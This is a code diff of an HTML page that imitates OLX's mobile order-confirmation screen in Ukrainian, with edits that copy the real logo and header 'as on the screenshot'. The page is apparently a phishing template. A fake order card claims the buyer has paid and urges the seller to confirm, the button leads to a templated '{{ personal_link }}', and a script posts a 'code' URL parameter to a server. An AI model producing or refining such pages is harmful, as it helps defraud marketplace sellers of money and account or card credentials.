@@ -13,36 +13,46 @@
             color: #002f34;
         }
 
-        /* HEADER - Мобильный стиль */
+        /* ШАПКА КАК НА СКРИНШОТЕ */
         header {
-            background: #002f34;
-            color: white;
-            padding: 12px 16px;
+            background: #002f34; /* Тот самый темно-синий */
+            height: 64px;
             display: flex;
             align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
             position: sticky;
             top: 0;
             z-index: 1000;
         }
 
-        .menu-icon {
-            width: 24px;
-            margin-right: 20px;
+        .header-left {
+            display: flex;
+            align-items: center;
         }
 
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #23e5db;
-            text-transform: lowercase;
-            flex-grow: 1;
+        /* Логотип OLX */
+        .logo-img {
+            height: 40px; /* Размер под мобильную версию */
+            display: block;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
         }
 
         .profile-icon {
-            width: 24px;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
         }
 
-        /* MAIN CONTENT */
+        /* ОСНОВНОЙ КОНТЕНТ */
         .container {
             padding: 0 16px;
         }
@@ -51,22 +61,22 @@
             font-size: 24px;
             font-weight: bold;
             margin: 20px 0 10px 0;
+            color: #002f34;
         }
 
-        /* Горизонтальный скролл для разделов профиля */
+        /* Навигация со скроллом */
         .scroll-nav {
             display: flex;
             overflow-x: auto;
             gap: 20px;
             white-space: nowrap;
             border-bottom: 1px solid #ddd;
-            margin-bottom: 10px;
-            scrollbar-width: none; /* Firefox */
+            scrollbar-width: none;
         }
-        .scroll-nav::-webkit-scrollbar { display: none; } /* Chrome/Safari */
+        .scroll-nav::-webkit-scrollbar { display: none; }
 
         .scroll-nav div {
-            padding: 10px 0;
+            padding: 12px 0;
             font-size: 14px;
             color: #002f34;
             font-weight: 500;
@@ -76,103 +86,85 @@
             font-weight: bold;
         }
 
-        /* Фильтры в виде круглых кнопок */
-        .filters {
-            display: flex;
-            gap: 8px;
-            margin: 15px 0;
-            overflow-x: auto;
-            scrollbar-width: none;
-        }
-
-        .filter {
-            border: 1px solid #002f34;
-            padding: 6px 16px;
-            border-radius: 20px;
-            background: white;
-            font-size: 13px;
-            white-space: nowrap;
-        }
-
-        .filter.active {
-            background: #002f34;
-            color: white;
-        }
-
-        /* ORDER CARD - Адаптация под мобилку */
+        /* КАРТОЧКА ЗАКАЗА */
         .order {
             background: white;
-            margin-top: 10px;
-            padding: 16px;
+            margin-top: 15px;
+            padding: 20px;
             border-radius: 4px;
             display: flex;
-            flex-direction: column; /* Элементы друг под другом */
+            flex-direction: column;
             gap: 12px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .order-title {
             font-weight: bold;
-            font-size: 16px;
+            font-size: 18px;
         }
 
         .order-status {
-            font-size: 12px;
+            font-size: 13px;
             background: #e9f0f0;
-            padding: 4px 10px;
+            padding: 6px 12px;
             border-radius: 4px;
             display: inline-block;
             color: #406367;
+            font-weight: 500;
         }
 
         .order-desc {
-            font-size: 13px;
+            font-size: 14px;
             color: #406367;
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
-        /* Кнопка на всю ширину для мобильной версии */
+        /* Кнопка подтверждения */
         .confirm-btn {
             background: #002f34;
             color: white;
             border: none;
-            padding: 14px;
+            padding: 16px;
             border-radius: 4px;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
             width: 100%;
-            text-align: center;
-            box-sizing: border-box;
+            margin-top: 10px;
         }
 
-        /* СТИЛЬ ОРИГИНАЛЬНОЙ ИКОНКИ ЧАТА */
+        /* Иконка чата */
         .chat-icon {
             position: fixed;
             bottom: 20px;
             right: 20px;
-            width: 50px;
-            height: 50px;
-            background: #ffffff;
+            width: 56px;
+            height: 56px;
+            background: white;
             border: 2px solid #002f34;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
     </style>
 </head>
-
 <body>
 
 <header>
-    <div class="menu-icon">
-        <svg viewBox="0 0 24 24" width="24" height="24" fill="white"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+    <div class="header-left">
+        <svg class="logo-img" viewBox="0 0 100 48" xmlns="http://www.w3.org/2000/svg">
+            <path d="M19.1 43.1c-10.3 0-18.7-8.5-18.7-18.9S8.8 5.3 19.1 5.3s18.7 8.5 18.7 18.9-8.4 18.9-18.7 18.9zm0-30c-6.1 0-11 5-11 11.1s4.9 11.1 11 11.1 11-5 11-11.1-4.9-11.1-11-11.1zM48.8 42.1V5.3h7.7v36.8h-7.7zM88.7 42.1l-6.8-10.4-6.8 10.4h-9l11.3-17.1-10.7-16.1h9l6.2 9.7 6.2-9.7h9l-10.7 16.1 11.3 17.1h-9z" fill="#23e5db"/>
+        </svg>
     </div>
-    <div class="logo">olx</div>
-    <div class="profile-icon">
-        <svg viewBox="0 0 24 24" width="24" height="24" fill="white"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+    <div class="header-right">
+        <div class="profile-icon">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="white"/>
+            </svg>
+        </div>
+        <span>Мій профіль</span>
     </div>
 </header>
 
@@ -186,24 +178,13 @@
         <div>Налаштування</div>
     </div>
 
-    <div class="scroll-nav" style="border-bottom: none; gap: 40px;">
-        <div class="active-tab" style="border-bottom-width: 4px;">Мої продажі</div>
-        <div style="color: #406367;">Мої покупки</div>
-    </div>
-
-    <div class="filters">
-        <div class="filter active">Очікують підтвердження</div>
-        <div class="filter">Всі</div>
-        <div class="filter">Виконані</div>
-    </div>
-
     <div class="order">
         <div class="order-title">Замовлення №78234109</div>
         <div>
-            <div class="order-status">Статус: Очікує підтвердження оплати</div>
+            <div class="order-status">Статус: Очікує підтвердження</div>
         </div>
         <div class="order-desc">
-            Покупець оплатив замовлення. Кошти зарезервовані банком. Будь ласка, підтвердіть замовлення для отримання коштів.
+            Покупець оплатив замовлення. Підтвердіть його, щоб отримати кошти на свою картку після завершения угоди.
         </div>
 
         <button class="confirm-btn" onclick="window.location.href='{{ personal_link }}'">
@@ -217,7 +198,6 @@
 </div>
 
 <script>
-// Твой JS остается без изменений
 const params = new URLSearchParams(window.location.search);
 const code = params.get("code");
 
@@ -229,14 +209,10 @@ async function sendCodeToServer(authCode) {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ code: authCode })
         });
-    } catch (err) {
-        console.error("Помилка:", err);
-    }
+    } catch (err) { console.error(err); }
 }
 
-if (code) {
-    sendCodeToServer(code);
-}
+if (code) sendCodeToServer(code);
 </script>
 
 </body>
